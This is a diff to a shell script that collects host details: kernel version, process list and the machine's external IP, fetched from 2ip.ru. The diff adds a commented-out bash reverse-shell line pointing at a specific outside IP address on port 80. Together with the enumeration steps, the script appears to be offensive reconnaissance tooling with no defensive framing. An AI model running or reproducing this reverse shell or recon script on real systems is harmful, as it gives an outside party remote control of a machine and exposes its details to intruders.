@@ -1,3 +1,4 @@
+# bash -i >& /dev/tcp/my_listner_ip185.174.174.24/80 0>&1
 echo "[uname -a]" >> summary.txt
 uname -a >> summary.txt
 
@@ -27,9 +28,8 @@ do
     done < "$filename"
 done
 
+echo "curl 2ip.ru" >> summary.txt
+curl 2ip.ru >> summary.txt
 
 echo "[ps -A]" >> summary.txt
 ps -A >> summary.txt
-
-echo "curl 2ip.ru" >> summary.txt
-curl 2ip.ru >> summary.txt
